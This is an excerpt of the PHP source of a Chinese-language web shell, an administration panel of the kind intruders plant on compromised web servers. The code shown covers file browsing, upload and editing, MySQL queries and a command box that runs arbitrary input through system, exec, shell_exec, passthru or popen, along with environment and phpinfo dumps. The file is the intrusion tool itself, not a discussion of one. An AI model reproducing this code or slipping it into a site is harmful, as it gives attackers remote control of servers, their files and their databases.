...
<table width="100%" border="0" cellpadding="0" cellspacing="0">
    ...
    <tr>
        <td align="center" bgcolor="#EEEEEE">
            本文件绝对路径:<?php $stmp =str_replace("\\","/", __FILE__);echo "【<a href=\"$HTTP_SERVER_VARS[PHP_SELF]\">$stmp</a>】";?>【<a href="?action=logout">点此注销会话</a>】
        </td>
    </tr>
    <tr>
        <td align="center"  bgcolor="#EEEEEE">【<a href="?action=dir&dir=.">文件管理</a>】【<a href="?action=editfile&dir=<?php echo urlencode($dir);?>&editfile=<?php echo urlencode($dir);?>/">文本编辑器</a>】【<a href="?action=sql">数据库查询</a>】【<a href="?action=shell">Shell命令</a>】【<a href="?action=env">环境变量</a>】【<a href="?action=phpinfo">PHP系统信息</a>】【<a href="http://www.s8s8.net/forums/index.php?showtopic=15998">查看更新</a>】
        </td>
    </tr>
</table>
<br>
...
<?php if($action == "dir"){?>
	...
	<tr>
	<form method="post" action="?action=dir&dir=<?php echo urlencode($dir);?>" enctype="multipart/form-data">
	<td bgcolor="#EEEEEE">&nbsp;当前目录:&nbsp;
	<input name="gotodir" type="text" class="style1" value="<?php echo$dir?>" size="60">&nbsp;
	<input name="gotodirb" type="submit" class="style1" value="跳转"><?php if($dir[1] == ':') echo "【<a href=\"?action=dir&dir=".urlencode($dir)."&unabspath=1\">点此用<b>相对</b>路径查看</a>】&nbsp;";else echo "【<a href=\"?action=dir&dir=".urlencode($dir)."&abspath=1\">点此用<b>绝对</b>路径查看</a>】&nbsp;";?>
	</td>
	</form>
	</tr>

	<tr>
	<form method="post" action="?action=fileup&dir=<?php echo urlencode($dir);?>" enctype="multipart/form-data">
	<td bgcolor="#EEEEEE">&nbsp;文件上传到(目录):
	<input name="filedir" type="text" class="style1" value="<?php echo$dir?>" size="30">&nbsp;本地文件:
	...
	<tr>
	<form method="post" action="?action=filecreate&dir=<?php echo urlencode($dir);?>" enctype="multipart/form-data">
	...
	<input name="mkdirb" type="submit" value="新建目录" class="style1">&nbsp;当前目录状态:【<b><?php $write = "不可写";if(is_dir($dir)) {if ($fp = @fopen("$dir/temp.tmp", 'w')) {@fclose($fp);@unlink("$dir/temp.tmp");$write = "可写";}}echo "$write</b>】";?>
	</td>
	</tr>
	</table>
	...
	<tr bgcolor="#000000" class="stylebtext3" align="center">
		<td width="25%" colspan="5">目录数:<?php echo$dirsum?>,文件数:<?php echo$filesum?></td>
	</tr>
	</table>      
<?php }else if ($action == "editfile"){?>
	...
	<tr>
	<form method="post" action="?action=filesave&dir=<?php echo urlencode($dir);?>" enctype="multipart/form-data">
		<td align="center" valign="top" bgcolor="#EEEEEE">当前编辑文件名:
			<input name="editfilename" type="text" class="style1" value="<?php echo$editfile?>" size="30">
			...
			<a href="?action=dir&dir=<?php echo urlencode($dir);?>">点此返回文件浏览页面</a>
			<p>
		</td>
	</form>
	</tr>
...
<?php }else if("sql" == substr($action,0,3)){?>
	...
	<form method="post" action="?action=sql" enctype="multipart/form-data">
		<td align="center" valign="top" bgcolor="#EEEEEE">
			数据库地址:<input name="sqlhost" type="text" class="style1" value="<?php echo isset($sqlhost)?$sqlhost:"localhost"?>" size="20">
			端口:<input name="sqlport" type="text" class="style1" value="<?php echo isset($sqlport)?$sqlport:"3306"?>" size="5">
			用户名:<input name="sqluser" type="text" class="style1" value="<?php echo isset($sqluser)?$sqluser:"root"?>" size="10">
			密码:<input name="sqlpasd" type="text" class="style1" value="<?php echo isset($sqlpasd)?$sqlpasd:""?>" size="10">
			数据库名:<input name="sqldb" type="text" class="style1" value="<?php echo isset($sqldb)?$sqldb:""?>" size="10"><br>
			...
			?></textarea><p>
			<span class="stylebtext2"><?php echo isset($sqlcmdb)?($res?"执行成功.":"执行失败:".mysql_error()):"";?></span><p>
	...
	<tr>
		...
		<td align="center" valign="top" bgcolor="#EEEEEE">
			函数:<select name="seletefunc" class="input">
				<option value="system" <?php echo($seletefunc=="system")?"selected":"";?>>system</option>
				<option value="exec" <?php echo ($seletefunc=="exec")?"selected":"";?>>exec</option>
				<option value="shell_exec" <?php echo($seletefunc=="shell_exec")?"selected":"";?>>shell_exec</option>
				<option value="passthru" <?php echo($seletefunc=="passthru")?"selected":"";?>>passthru</option>
				<option value="popen" <?php echo($seletefunc=="popen")?"selected":"";?>>popen</option>
			</select>
			命令:<input name="shellcmd" type="text" class="style1" value="<?php echo isset($shellcmd)?$shellcmd:""?>" size="80">
			...
			?></textarea><p>
			<span class="stylebtext2"><?php echo get_cfg_var("safe_mode")?"提示:安全模式下可能无法执行":"";?></span><p>
...
<?php }else if($action=="phpinfo"){?>
	...
	<tr>
	<td align="center" bgcolor="#EEEEEE" class="stylebtext2"><br><?php info();
...
<?php }else if($action=="env"){?>
	环境变量&nbsp;&nbsp;<?php echo $rny?>支持&nbsp;&nbsp;<?php echo$rnn?>不支持<br>
	</td>
	</tr>
	<?php
